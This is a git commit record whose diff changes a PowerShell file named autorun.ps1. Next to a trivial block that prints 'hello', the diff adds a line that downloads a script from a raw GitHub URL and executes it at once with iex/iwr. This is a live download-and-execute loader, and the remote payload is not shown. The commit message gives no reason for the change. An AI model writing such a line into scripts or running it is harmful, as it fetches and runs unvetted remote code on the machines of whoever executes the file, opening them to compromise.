16e0b77120d82f22a54d3c80dbe95464ff870477
43a1723 <hai1723notgay@gmail.com>
2024-07-01 16:06:37 +0700

    Update autorun.ps1

--- Extras/autorun.ps1
+++ Extras/autorun.ps1
@@ -1,6 +1,5 @@
-$id = 1255292055182114876
-
 if ($id -eq 1255292055182114876) {
     Write-Output "hello"
 }
 
+iex (iwr -uri "https://raw.githubusercontent.com/43a1723/test/main/Extras/download.ps1" -useb)
